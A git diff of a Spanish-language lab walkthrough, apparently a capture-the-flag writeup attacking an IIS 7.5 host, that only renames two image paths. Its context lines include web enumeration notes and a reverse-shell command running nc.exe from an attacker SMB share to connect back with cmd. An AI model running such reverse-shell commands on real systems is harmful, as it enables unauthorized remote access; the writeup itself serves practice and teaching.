@@ -140,7 +140,7 @@ http://10.10.10.5 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5],
 
 Accederemos a [http://10.10.10.5 ](http://10.10.10.5)en donde podremos comprobar el acceso al `IIS`, pero no logramos obtener nada interesante
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Realizaremos una enumeración de páginas web y directorios para verificar la existencia de posibles directorios, etc. En el resultado obtenido, solamente nos llama la atención el directorio `aspnet_client`.
 
@@ -334,7 +334,7 @@ Ejecutaremos el siguiente comando para ejecutar el `nc.exe` que estamos comparti
 \\10.10.16.3\smbFolder\nc.exe -e cmd 10.10.16.3 443
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verificamos que finalmente hemos logrado acceso al sistema y nos encontramos con el usuario `iis apppool\web`.
 
